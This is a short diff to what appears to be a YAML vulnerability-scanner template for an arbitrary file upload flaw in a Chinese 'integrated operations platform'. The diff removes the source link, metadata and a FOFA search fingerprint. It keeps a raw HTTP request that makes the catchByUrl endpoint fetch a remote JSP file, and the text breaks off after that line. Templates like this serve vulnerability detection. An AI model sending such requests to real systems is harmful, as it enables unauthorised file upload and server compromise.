@@ -3,12 +3,8 @@ info:
   name: 北京中科聚网一体化运营平台 catchByUrl 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kn7a3ihx74ggw3te'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kn7a3ihx74ggw3te
-    fofa: title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
 http:
 - raw:
   - 'GET /resources/files/ue/catchByUrl?url=http://www.baidu.com/dudesuite.jsp HTTP/1.1
